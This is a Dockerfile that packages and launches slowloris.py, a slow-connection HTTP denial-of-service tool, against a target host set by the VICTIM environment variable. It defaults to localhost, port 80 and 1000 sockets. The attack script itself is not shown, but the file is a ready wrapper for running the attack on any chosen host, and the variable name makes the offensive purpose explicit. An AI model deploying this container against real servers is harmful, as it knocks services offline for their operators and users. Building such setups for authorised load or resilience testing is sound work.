FROM ubuntu:16.04

RUN apt-get update
RUN apt-get dist-upgrade -y


# Install the relevant packages
RUN apt-get install -y python3


COPY . /root/.


# Execute the containers startup script which will start many processes/services
# The startup file was already added when we added "project"
#CMD ["/bin/bash", "/var/www/vida-frontend/project/docker/startup.sh"]

# Set the default victim to be localhost if user doesn't set the VICTIM
ENV VICTIM localhost
ENV PORT 80
ENV NUM_SOCKETS 1000
ENV HTTPS=""

CMD /usr/bin/python3 /root/slowloris.py $VICTIM --port=$PORT --sockets=$NUM_SOCKETS $HTTPS